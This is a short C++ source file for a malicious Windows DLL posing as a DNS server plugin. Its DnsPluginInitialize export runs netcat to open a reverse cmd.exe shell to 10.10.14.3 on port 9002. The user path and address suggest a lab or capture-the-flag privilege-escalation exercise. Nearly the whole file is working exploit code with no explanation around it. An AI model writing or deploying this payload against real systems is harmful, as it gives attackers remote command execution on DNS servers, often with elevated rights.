//dllmain.cpp: Defines the entry point for the DLL application
//#include "stdafx.h"
#include "stdio.h"
#include "windows.h"
#include "stdlib.h"
#define EXTERN_DLL_EXPORT extern "C" __declspec(dllexport)

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call,LPVOID lpReserved){
switch(ul_reason_for_call){
case DLL_PROCESS_ATTACH:
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DETACH:
	break;
} 
return TRUE;
}

EXTERN_DLL_EXPORT int DnsPluginInitialize(PVOID a1 , PVOID a2){
system("C:\\users\\ryan\\desktop\\nc64.exe 10.10.14.3 9002 -e cmd.exe");
return 0;
}

EXTERN_DLL_EXPORT int DnsPluginCleanup(){
return 0;
}

EXTERN_DLL_EXPORT int DnsPluginQuery(PVOID a1, PVOID a2, PVOID a3, PVOID a4){
return 0;
}
